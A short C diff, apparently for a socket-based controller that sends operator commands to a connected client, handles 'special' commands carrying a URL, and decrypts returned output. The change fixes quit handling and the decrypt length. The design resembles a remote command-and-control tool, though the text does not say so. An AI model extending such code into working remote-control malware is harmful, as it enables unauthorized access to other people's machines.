@@ -100,11 +100,6 @@ void clientHandler(SOCKET clientSocket)
     {
         int commandSize = 0;
         quit = getUserCommand(&command);
-        if (quit)
-        {
-            printf("[i] Quit command received\n");
-            break;
-        }
 
         special = isSpecial(command);
         if (special)
@@ -119,7 +114,12 @@ void clientHandler(SOCKET clientSocket)
         {
             printf("[!] Could not send command\n");
         }
-        if (special)
+        if (quit)
+        {
+            printf("[i] Quit command received\n");
+            break;
+        }
+        else if (special)
         {
             snprintf(message, BUF_SIZE, SPECIAL_FMT, command, commandSize, URL);
             if (sendCommand(&clientSocket, message) == SOCKET_ERROR)
@@ -138,7 +138,7 @@ void clientHandler(SOCKET clientSocket)
             printf("[!] Invalid Response\n");
         }
         result[expectedBuffer] = CF_NULL;
-        decrypt(command, result, expectedBuffer, expectedBuffer);
+        decrypt(command, result, expectedBuffer, expectedBuffer + (expectedBuffer & 1));
         printf("%s\n", result);
     }
     closesocket(clientSocket);
